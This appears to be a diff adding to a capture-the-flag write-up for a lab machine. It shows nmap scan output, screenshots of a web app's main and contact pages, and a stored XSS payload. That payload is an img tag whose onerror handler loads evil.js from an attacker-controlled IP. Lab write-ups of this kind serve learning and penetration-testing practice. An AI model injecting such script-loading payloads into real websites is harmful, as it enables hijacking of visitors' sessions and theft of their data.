@@ -17,3 +17,15 @@
     | http-title: Site doesn't have a title (text/html; charset=UTF-8).
     |_Requested resource was /static/index.html
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Main page 
+
+![main page](https://github.com/zer00d4y/writeups/assets/128820441/3a3da767-6608-4a9c-adb9-1daa98b7adbd)
+
+`Contact us` page 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/03f12159-e8aa-4ad2-be42-67d0b66cf0e3)
+
+    <img SRC=p onerror="var script1 = document.createElement("script"); script1.src = 'http://10.10.14.91/evil.js'; document.head.appendChild(script1);" />
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/dbb7cf44-9bf2-4cf7-b497-e22ad43b2c71)
